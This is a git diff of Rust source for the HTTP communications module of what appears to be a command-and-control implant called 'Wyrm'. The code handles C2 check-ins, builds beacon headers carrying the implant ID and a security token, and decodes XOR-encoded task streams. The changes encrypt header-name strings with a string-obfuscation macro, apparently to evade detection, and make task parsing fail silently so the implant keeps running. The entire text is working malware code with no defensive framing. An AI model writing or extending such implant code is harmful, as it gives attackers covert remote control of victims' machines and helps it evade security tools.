@@ -2,13 +2,14 @@
 
 use std::collections::HashMap;
 
-use crate::wyrm::Wyrm;
+use crate::{utils::time_utils::epoch_now, wyrm::Wyrm};
 use minreq::Response;
 use rand::Rng;
 use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
     tasks::{Command, Task},
 };
+use str_crypter::{decrypt_string, sc};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 fn construct_c2_url(implant: &Wyrm) -> String {
@@ -65,6 +66,7 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
             id: 0,
             command: Command::Sleep,
             metadata: None,
+            completed_time: epoch_now(),
         });
 
         return Ok(tasks);
@@ -120,9 +122,9 @@ fn generate_generic_headers(
 ) -> HashMap<String, String> {
     let mut headers = HashMap::new();
 
-    let _ = headers.insert("WWW-Authenticate".to_string(), implant_id.to_owned());
-    let _ = headers.insert("User-Agent".to_string(), ua.to_string());
-    let _ = headers.insert("Authorization".to_string(), security_token.to_owned());
+    let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
+    let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
+    let _ = headers.insert(sc!("Authorization", 92).unwrap(), security_token.to_owned());
 
     headers
 }
@@ -138,8 +140,10 @@ fn generate_generic_headers(
 /// A vector of [`Task`] ready to be dispatched or otherwise available to work with.
 pub fn decode_tasks_stream(byte_response: &[u8]) -> Vec<Task> {
     // Parse JSON into the inner binary packets
-    let packets: Vec<Vec<u8>> =
-        serde_json::from_slice(byte_response).expect("could not parse tasks JSON");
+    let packets: Vec<Vec<u8>> = match serde_json::from_slice(byte_response) {
+        Ok(p) => p,
+        Err(_) => return vec![],
+    };
 
     // For each packet, undo the XOR and decode header+body
     packets
@@ -184,6 +188,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq:
             id: 0,
             command: Command::AgentsFirstSessionBeacon,
             metadata: None,
+            completed_time: epoch_now(),
         });
 
         return Ok(tasks);
